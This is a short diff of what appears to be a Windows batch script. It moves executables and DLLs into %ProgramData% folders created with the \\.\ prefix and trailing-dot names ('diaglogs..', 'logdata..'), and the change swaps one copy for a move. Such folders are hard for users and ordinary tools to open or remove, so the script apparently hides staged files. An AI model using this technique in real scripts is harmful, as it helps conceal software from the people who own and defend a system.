@@ -42,7 +42,7 @@ mkdir \\.\%ProgramData%\diaglogs..\
 copy /Y "%ProgramData%\Comms\Index.exe" "\\.\%ProgramData%\logdata..\"
 move /Y "%ProgramData%\Comms\IconLib.dll" "\\.\%ProgramData%\logdata..\"
 
-copy /Y "%ProgramData%\Comms\Index.exe" "\\.\%ProgramData%\diaglogs..\"
+move /Y "%ProgramData%\Comms\Index.exe" "\\.\%ProgramData%\diaglogs..\"
 move /Y "%ProgramData%\Comms\Kape.dll" "\\.\%ProgramData%\diaglogs..\"
 
 move /Y "%ProgramData%\Comms\libssl-1_1.dll" "\\.\%ProgramData%\config..\"
